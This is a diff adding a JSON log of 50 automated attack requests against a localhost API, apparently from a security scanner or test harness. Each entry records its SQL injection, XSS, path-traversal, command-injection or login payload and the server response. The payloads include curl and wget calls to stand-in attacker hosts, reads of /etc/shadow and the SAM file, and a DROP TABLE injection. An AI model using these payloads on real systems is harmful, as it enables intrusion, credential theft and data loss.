@@ -1,0 +1,463 @@
+{
+  "target": "http://localhost:8082",
+  "timestamp": "2025-11-02T19:20:12.209124",
+  "results": [
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 18,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "SQLi",
+      "payload": "admin' --"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 28,
+      "response_length": 109,
+      "response_text": "{\"error\":\"Your search query contains potentially harmful content. Please try again with a different query.\"}\n",
+      "attack_type": "XSS",
+      "payload": "<iframe src=data:text/html,<script>alert('XSS')</script>>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 23,
+      "response_length": 47,
+      "response_text": "{\"error\":\"Invalid characters in search query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "$(whoami)"
+    },
+    {
+      "success": true,
+      "status_code": 401,
+      "latency_ms": 1044,
+      "response_length": 101,
+      "response_text": "{\"code\":\"AUTH_FAILED\",\"error\":\"Invalid username or password\",\"remaining_attempts\":3,\"success\":false}\n",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 15,
+      "response_length": 40,
+      "response_text": "{\"error\":\"Invalid characters in query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "; ping -c 10 127.0.0.1"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 29,
+      "response_length": 61,
+      "response_text": "{\"error\":\"An error occurred while processing your request.\"}\n",
+      "attack_type": "SQLi",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 19,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "Traversal",
+      "payload": "..%252f..%252f..%252fetc%252fpasswd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 17,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "SQLi",
+      "payload": "' OR 'a'='a"
+    },
+    {
+      "success": true,
+      "status_code": 404,
+      "latency_ms": 139,
+      "response_length": 130,
+      "response_text": "{\"available_endpoints\":[\"/api/users\",\"/api/search\",\"/api/login\"],\"code\":\"NOT_FOUND\",\"error\":\"Endpoint not found\",\"success\":false}\n",
+      "attack_type": "SQLi",
+      "payload": "' OR '1'='1"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 9,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' AND 1=2--"
+    },
+    {
+      "success": true,
+      "status_code": 401,
+      "latency_ms": 990,
+      "response_length": 101,
+      "response_text": "{\"code\":\"AUTH_FAILED\",\"error\":\"Invalid username or password\",\"remaining_attempts\":3,\"success\":false}\n",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 18,
+      "response_length": 51,
+      "response_text": "{\"error\":\"Invalid characters in the search query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "| curl http://attacker.com"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 26,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "Traversal",
+      "payload": "../../../etc/passwd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 8,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "Traversal",
+      "payload": "..//..//..//etc//passwd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 12,
+      "response_length": 26,
+      "response_text": "{\"error\":\"Invalid query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' ORDER BY 1--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 13,
+      "response_length": 73,
+      "response_text": "{\"message\":\"Your search query was successfully processed.\",\"results\":[]}\n",
+      "attack_type": "XSS",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 11,
+      "response_length": 62,
+      "response_text": "{\"message\":\"Search query executed successfully\",\"results\":[]}\n",
+      "attack_type": "XSS",
+      "payload": "<body onload=alert('XSS')>"
+    },
+    {
+      "success": true,
+      "status_code": 500,
+      "latency_ms": 143,
+      "response_length": 430,
+      "response_text": "{\"code\":\"SQL_ERROR\",\"details\":\"MySQL Error 1064: You have an error in your SQL syntax near '{'q': \\\"' OR 1=1--\\\"}' at line 1\",\"error\":\"Database query failed\",\"query\":\"SELECT * FROM posts WHERE title LIKE '%{'q': \\\"' OR 1=1--\\\"}%'\",\"server_time\":\"2025-11-03 02:19:52\",\"stack_trace\":[\"/var/www/api/search.php:89\",\"/var/www/api/database.php:127\",\"/var/www/api/index.php:34\"],\"success\":false,\"timestamp\":\"2025-11-03T02:19:52.190550\"}\n",
+      "attack_type": "SQLi",
+      "payload": "' OR 1=1--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 20,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "Traversal",
+      "payload": "../../etc/passwd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 24,
+      "response_length": 26,
+      "response_text": "{\"error\":\"Invalid query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' AND (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 12,
+      "response_length": 26,
+      "response_text": "{\"error\":\"Invalid query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' ORDER BY 10--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 8,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' UNION SELECT username, password FROM users--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 10,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "Traversal",
+      "payload": "..\\..\\windows\\system32\\config\\sam"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 39,
+      "response_length": 59,
+      "response_text": "{\"error\":\"Access to the requested resource is forbidden.\"}\n",
+      "attack_type": "Traversal",
+      "payload": "....\\....\\....\\windows\\system.ini"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 10,
+      "response_length": 47,
+      "response_text": "{\"error\":\"Invalid characters in search query\"}\n",
+      "attack_type": "XSS",
+      "payload": "javascript:alert('XSS')"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 28,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "Traversal",
+      "payload": "....//....//etc/passwd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 27,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' AND 1=1--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 28,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "' UNION SELECT NULL--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 22,
+      "response_length": 62,
+      "response_text": "{\"message\":\"No results found for search query.\",\"results\":[]}\n",
+      "attack_type": "XSS",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 22,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "' UNION ALL SELECT NULL,NULL,NULL--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 26,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' UNION SELECT NULL,NULL,NULL,NULL--"
+    },
+    {
+      "success": true,
+      "status_code": 401,
+      "latency_ms": 1642,
+      "response_length": 101,
+      "response_text": "{\"code\":\"AUTH_FAILED\",\"error\":\"Invalid username or password\",\"remaining_attempts\":3,\"success\":false}\n",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 19,
+      "response_length": 61,
+      "response_text": "{\"results\":\"Your search query contained invalid characters\"}\n",
+      "attack_type": "XSS",
+      "payload": "<img src=x onerror=alert('XSS')>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 30,
+      "response_length": 26,
+      "response_text": "{\"error\":\"Invalid query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' AND SLEEP(5)--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 22,
+      "response_length": 36,
+      "response_text": "{\"error\":\"Invalid query parameter\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' WAITFOR DELAY '0:0:5'--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 10,
+      "response_length": 26,
+      "response_text": "{\"error\":\"Invalid query\"}\n",
+      "attack_type": "Traversal",
+      "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 11,
+      "response_length": 47,
+      "response_text": "{\"error\":\"Invalid characters in search query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "; ls -la"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 10,
+      "response_length": 54,
+      "response_text": "{\"error\":\"Invalid characters in the query parameter\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "; wget http://evil.com/shell.sh"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 8,
+      "response_length": 44,
+      "response_text": "{\"error\":\"Invalid characters in the query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "`whoami`"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 26,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "'; DROP TABLE users--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 24,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "XSS",
+      "payload": "<select onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 26,
+      "response_length": 70,
+      "response_text": "{\"error\":\"Invalid characters in the search query. Please try again.\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "&& cat /etc/shadow"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 19,
+      "response_length": 54,
+      "response_text": "{\"error\":\"Invalid characters in the query parameter\"}\n",
+      "attack_type": "XSS",
+      "payload": "<iframe src='javascript:alert(1)'>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 21,
+      "response_length": 33,
+      "response_text": "{\"error\":\"Invalid search query\"}\n",
+      "attack_type": "SQLi",
+      "payload": "admin'--"
+    },
+    {
+      "success": true,
+      "status_code": 404,
+      "latency_ms": 133,
+      "response_length": 130,
+      "response_text": "{\"available_endpoints\":[\"/api/users\",\"/api/search\",\"/api/login\"],\"code\":\"NOT_FOUND\",\"error\":\"Endpoint not found\",\"success\":false}\n",
+      "attack_type": "SQLi",
+      "payload": "' OR '1'='1' /*"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 46,
+      "response_length": 54,
+      "response_text": "{\"error\":\"Invalid characters in the query parameter\"}\n",
+      "attack_type": "XSS",
+      "payload": "<input onfocus=alert('XSS') autofocus>"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 28,
+      "response_length": 51,
+      "response_text": "{\"error\":\"Invalid characters in the search query\"}\n",
+      "attack_type": "XSS",
+      "payload": "<svg onload=alert('XSS')>"
+    },
+    {
+      "success": true,
+      "status_code": 500,
+      "latency_ms": 123,
+      "response_length": 440,
+      "response_text": "{\"code\":\"SQL_ERROR\",\"details\":\"MySQL Error 1064: You have an error in your SQL syntax near '{'q': \\\"1' OR '1'='1'--\\\"}' at line 1\",\"error\":\"Database query failed\",\"query\":\"SELECT * FROM posts WHERE title LIKE '%{'q': \\\"1' OR '1'='1'--\\\"}%'\",\"server_time\":\"2025-11-03 02:20:11\",\"stack_trace\":[\"/var/www/api/search.php:89\",\"/var/www/api/database.php:127\",\"/var/www/api/index.php:34\"],\"success\":false,\"timestamp\":\"2025-11-03T02:20:11.112965\"}\n",
+      "attack_type": "SQLi",
+      "payload": "1' OR '1'='1'--"
+    },
+    {
+      "success": true,
+      "status_code": 200,
+      "latency_ms": 10,
+      "response_length": 51,
+      "response_text": "{\"error\":\"Invalid characters in the search query\"}\n",
+      "attack_type": "CommandInjection",
+      "payload": "| cat /etc/passwd"
+    },
+    {
+      "success": true,
+      "status_code": 401,
+      "latency_ms": 1422,
+      "response_length": 101,
+      "response_text": "{\"code\":\"AUTH_FAILED\",\"error\":\"Invalid username or password\",\"remaining_attempts\":3,\"success\":false}\n",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    }
+  ],
+  "stats": {
+    "total": 50,
+    "successful": 50,
+    "success_rate": 100.0,
+    "avg_latency": 129.36,
+    "variability": 40.0
+  }
+}
